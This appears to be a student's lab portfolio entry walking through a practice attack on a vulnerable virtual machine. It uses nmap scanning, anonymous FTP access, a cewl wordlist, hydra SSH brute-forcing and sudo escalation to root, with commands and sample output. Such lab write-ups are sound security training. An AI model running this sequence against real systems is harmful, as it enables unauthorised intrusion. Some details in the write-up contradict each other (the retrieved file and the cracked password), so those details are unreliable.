# Portfolio
##Project 1: Network reconnaissance using Nmap 
In this lab , I setup a virtual environment to practice scanning on a vulnerable machine 

###Commands Used

***nmap <target ip> -p-

-p- -this is to scan all 65535 ports in the target machine


***nmap <target ip> -Pn -n -sV -O


-Pn-this flag treats the target as alive and forces nmap to scan the ports which are open in the target machine


-n-normally nmap does the reverse DNS lookup which means it scans and teels the domain name in the target network.
   but this flag tells nmap to skip searching for domain names which eventually saves a lot of time.


-sV-this flag helps me to find the exact versions of the ports which are open

 
 -O-this helps to find the operating system of the target which helps to collect further information about those operating systems.
 
!! OUTPUT- scanning the network showed me that there is port number 21,22 and 80 ftp,ssh and http respectively are open and also got the information about their service version
 service version helps me to find vulnerabilities using Nmap Script Engine(NSE) or msfconsole metasploit

***find / -name *.nse | grep ftp or ssh

find- this command is used to find the file or directories wherever it is stored...In the current scenario it was used to find the script

grep-It is used to filter out the specific search for our requirement i.e ftp script ingines in the above command

!!OUTPUT- This command help me filter out script engines that is relatred to FTP OR SSH which are open

/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-brute.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/tftp-version.nse
/usr/share/nmap/scripts/tftp-enum.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ssh-publickey-acceptance.nse
/usr/share/nmap/scripts/ssh-auth-methods.nse
/usr/share/nmap/scripts/sshv1.nse
/usr/share/nmap/scripts/ssh2-enum-algos.nse
/usr/share/nmap/scripts/ssh-hostkey.nse
/usr/share/nmap/scripts/ssh-run.nse
/usr/share/nmap/scripts/ssh-brute.nse

***nmap <target ip> --script-help /usr/share/nmap/scripts/ftp-anon.nse


this command gives information aout what this script will be performing if it is used.

ftp-anon.nse means this script finds if there is any or ftp allows ANONYMOUS login without any password

OUTPUT:
ftp-anon
Categories: default auth safe
https://nmap.org/nsedoc/scripts/ftp-anon.html
  Checks if an FTP server allows anonymous logins.

  If anonymous is allowed, gets a directory listing of the root directory
  and highlights writeable files.


***nmap <target ip> --script /usr/share/nmap/scripts/ftp-anon.nse -p 21

!!OUTPUT-

Nmap scan report 
Host is up (0.0015s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| vftpd 3.0.3 directory listing:
| -rw-r--r--    1 0        0            1024 Jan 12 14:22 confidential.txt
|_drwxr-xr-x    2 0        0            4096 Feb 18 09:15 pub


***FTP <targetip>


this commands allows me to connect to the ftp port if anonymous login is allowed.After using previous command, got to know that there is anonymous login
Here to login to the ftp the username can be ftp or anonymous and the password does not matter if it is empty.

!!OUTPUT

Connected to 
220 (vsFTPd 3.0.3)
Name (192.168.1.50:user): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls

after entering into the ftp console to view any files are accessible, ls(list) files is the command

which directed me to a file named hint.txt which is text file

**ftp> get hint.txt

get is the command to transfer the file from the ftp to the kali file system

**ftp> exit-to exit out of the ftp port

***cd Downloads

cd is the command to change directories..From the rood or home directory it chanded to the Downloads directory where the file hint.txt from the ftp will be transferd.

***cat hint.txt

cat command is to view the contents in the file and it also displays the file content in the terminal

hint.txt file which actually had the information about the username to the target machine

The anopther port which is 80 hhtp which is open version apache server can be accessible from the browser from where i will be creating the wordlist for the password

***cewl https://example.com -w wordlist.txt

Cewl is the command used to extract words from the webpage hosted in the client network and then it will be stored in a file which is named as wordlist.txt 

w- this flag is to mention the path where the wordlist is stored

As the username is identified from the earlier command and the wordlist has created for the password now its time to crack the password by BRUTE FORCING.  

the command used is HYDRA which will initiate scanning by trying different combination of password wordlist with the specified wordlist.

***hydra -l <username> -P /root/wordlist.txt -s 22 ssh -V -t 16

-l flag is used specifically when the username is known or L should be used if the username should be brute forced using the wordlist created from the any source available

-P flag is used to mention the path of the file whre the wordlist is saved or -p can be used if the password was available by any other method or from any other source

-s flag is to specify the port number and port name for which the password is required here in the given scnario password is required for port 22 SSH

-V verbose means print the result at the end where the combination of the username password is available

-t task to be completed at a time i.e how may username and password cominations must be scanned at once<br>The maximum number of task that can be performed is 32 at once which eventually will save time for the attacker


!!OUTPUT 

[STATUS] attack started for 192.168.1.50 (on port 22/tcp)
[22][ssh] host: 192.168.1.50   login: jack   password: password
[22][ssh] host: 192.168.1.50   login: jack   password: admin
[22][ssh] host: 192.168.1.50   login: jack   password: qwerty
[22][ssh] host: 192.168.1.50   login: jack   password: 123456
[22][ssh] host: 192.168.1.50   login: jack   password: secret123
[1] [ssh] host: 192.168.1.50   login: jack   password: secret123
1 of 1 target successfully completed, 1 valid password found
Hydra finished.


***ssh jack@<target ip> -p 22

-p Flag used to mention port number when the ssh is running on different port number rather than the default port number i.e 22

Once its connected to the ssh successfully it wshould be authenticated with the password i.e cybersecurity in the current scenario

!!OUTPUT

jack@192.168.1.50's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

System information as of Fri May 29 17:10:15 UTC 2026

  System load:  0.05               Processes:             102
  Usage of /:   12.4% of 19.56GB   Users logged in:       1
  Memory usage: 18%                IPv4 address for eth0: 192.168.1.50
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

Last login: Thu May 28 10:14:22 2026 from 192.168.1.100
jack@remote-server:~$

Note: here the ip address used is just to show the output

After the authentication to the ssh port is successful we get the access to the target's terminal with standard user <br>Next to get the root access which is the hihest priviledge in Linux we should perform the previledge escalation

jack@remote-server:~$ sudo -l<br> which asks for the sudo password for the jack user


To check the priviledge of the cuurent user that is jack

!!OUTPUT

[sudo] password for jack: 
Matching Defaults entries for jack on remote-server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jack may run the following commands on remote-server:
    (ALL : ALL) ALL

 ***jack@remote-server:~$ sudo -i<br>  The command sudo -i (often called "interactive login") is used to switch from your current user account completely into the root (administrator) user environment. Instead of typing sudo before every single command you want to run, sudo -i gives you a permanent administrative session until you type exit.

 !!OUTPUT

 jack@remote-server:~$ sudo -i
[sudo] password for jack: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-generic x86_64)

root@remote-server:~#

    





  






